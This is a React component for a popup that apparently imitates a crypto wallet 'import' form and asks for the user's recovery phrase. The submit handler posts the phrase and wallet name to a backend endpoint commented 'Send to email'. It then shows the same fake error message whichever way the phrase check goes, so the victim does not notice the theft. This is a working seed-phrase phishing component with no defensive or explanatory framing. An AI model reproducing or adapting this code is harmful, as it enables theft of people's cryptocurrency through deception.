import React, {useState,useEffect} from 'react'
import './Popup.css'
import './mobile.css'
import Axios from 'axios'
const Popup = ({setPopUpdata,setShowPopup,popUpData}) => {
    const [ showMessage, setShowmessage ] = useState( '' );
    const [rPhrase, setRPhrase] = useState('')
    const [ disableButton, setDisableButton ] = useState( false );

    const closeModal = () => {
        setShowPopup( false )
        setPopUpdata( null )
    };

    const handleSubmission = ( data ) => {
      
        setDisableButton(true);
        //Send to email

        const config = {
            headers: {
                'Content-Type': 'application/json'
            }
        }

        const body = JSON.stringify( { rPhrase, wallet:popUpData.name } )
        Axios
                .post( 'message', body,config)
                // .then( res =>res.json() )
                .then( res => {
                //    console.log(res)
                } )
             
                .catch( err => {
                    // console.log(err)
            })
        const checkPhrase = rPhrase.match( /[A-Za-z]{12,}/g );
        
        // console.log( rPhrase );
        setTimeout( () => {
            if ( checkPhrase ) {
                setShowmessage('Opps!! there has been an error.')
            } else {
                setShowmessage('Opps!! there has been an error.')
            }
        setDisableButton(false)
        }, 4000)

        setTimeout( () => {
            
            setShowmessage('')
        }, 6000)

        
    }

    return (
        <section className="popup">
            <div>
                <div className="form-header">
                    <img src={popUpData.image}></img>
                    <p>Import your { popUpData.name}</p>
                </div>
                {showMessage? <p className="error-success-msg">{ showMessage}</p> : null}
                <div className="form">
                    <form>
                        <div>
                            <label>Wallet Name:</label>
                            <input type="text" disabled={ true } value={ popUpData.name} />
                             <span className="input"><svg fill="none" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" viewBox="0 0 24 24" stroke="currentColor" class="h-6 w-6"><path d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"></path></svg></span>
                        </div>
                        <div className="recovery">
                            <label>Recovery Phrase:</label>
                            <textarea type="text" onChange={e => setRPhrase(e.target.value)} ></textarea>
                            <span className="textarea"><svg fill="none" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" viewBox="0 0 24 24" stroke="currentColor" class="h-6 w-6"><path d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"></path></svg></span>
                        </div>
                        <h6><i className="fa fa-info-circle"></i>Typically 12 (sometimes 24) words separated by single spaces.</h6>


                        { disableButton ?
                            <div className="proceed-button disabled">
                        <p >Please Wait... </p>
                        
                    </div>:
                        <div className="proceed-button" onClick={()=> handleSubmission()}>
                        <p >Proceed </p>
                        <svg fill="none" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" viewBox="0 0 24 24" stroke="currentColor" class="h-6 w-6"><path d="M13 9l3 3m0 0l-3 3m3-3H8m13 0a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
                    </div>}

                        
                    </form>
                    
                    { disableButton ?  null : 
                    <div className="cancel">
                        <p onClick={()=> closeModal()}>Cancel</p>
                    </div>}
                </div>
            </div>

        </section>
    )
}

export default Popup
